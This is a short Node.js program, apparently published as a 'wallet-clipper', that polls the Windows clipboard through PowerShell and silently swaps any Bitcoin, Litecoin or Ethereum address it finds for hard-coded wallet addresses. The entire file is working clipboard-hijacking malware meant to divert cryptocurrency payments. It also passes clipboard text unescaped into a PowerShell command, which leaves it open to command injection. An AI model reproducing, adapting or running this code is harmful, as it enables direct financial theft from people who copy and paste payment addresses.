const child_process = require("child_process");

class chain {
    constructor(address, regex, name) {
        this.address = address;
        this.regex = regex;
        this.name = name;
    }
}

function aziziswhite() {
    const chains = [
        new chain("bc1qwkgh8wpt988tf04u0ska955awhwey95tzjs26u", new RegExp("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"), "BTC"),
        new chain("LgRbjDdAUL1wt7E2umHLqiXdfPgKMEFs9R", new RegExp("(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)"), "LTC"),
        new chain("0xd73A2Ed25296257c0406e1772969be22732547E6", new RegExp("(?:^0x[a-fA-F0-9]{40}$)"), "ETH")
    ];

    while (true) {
        try {
            const paste = child_process.execSync(`powershell Get-Clipboard`).toString("utf8").replace("\r", "");
            let text = paste;
            let dtc = false;

            for (let i = 0; i < chains.length; i++) {
                const chain = chains[i];

                for (let line of text.split("\n")) {
                    if (line === chain.address) {
                        break;
                    }
                    if (chain.regex.test(line.replace("\r", ""))) {
                        dtc = true;
                        console.log("");
                        console.log("https://github.com/kfe3/wallet-clipper");
                        console.log("(" + chain.name + ") Swapped!");
                        console.log("Old Address: " + line);
                        console.log("New Address: " + chain.address);
                        console.log("https://github.com/kfe3/wallet-clipper");
                        console.log("");
                        text = text.replace(line, chain.address);
                    }
                }

                if (dtc) {
                    child_process.execSync(`powershell Set-Clipboard ${text}`);
                }
            }

        } catch (e) {
            console.error("An error occurred:", e);
        }
    }
}

aziziswhite();
